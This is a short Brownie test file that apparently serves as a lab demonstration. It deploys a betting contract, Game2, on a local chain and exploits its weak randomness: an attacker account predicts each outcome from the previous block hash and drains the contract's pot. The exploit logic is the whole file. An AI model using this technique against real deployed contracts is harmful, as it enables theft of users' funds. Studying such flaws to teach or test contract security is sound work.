from brownie import accounts, Game2, chain
from brownie.convert import to_uint

def test_weak_rand_2():
    #ACCT SETUP
    dep = accounts[0]
    attacker = accounts[1]
    # Assigning some value variable
    GAME_FEE = 1e18
    GAME_POT = 10e18
    INITIAL_BAL = attacker.balance()
    # Deploying Target contract
    game = Game2.deploy({'from': accounts[0], 'value': GAME_POT})

    # Attack - runn it 5 times
    for _ in range(0,5):
        game.play(True if (to_uint(chain[-1].hash) % 2) == 1 else False, {'from': attacker,'value': GAME_FEE})
        
    #Asserting INITIAL_BAL + GAME_POT
    assert(attacker.balance() == INITIAL_BAL + GAME_POT )
    assert(game.players(dep.address) == 0)
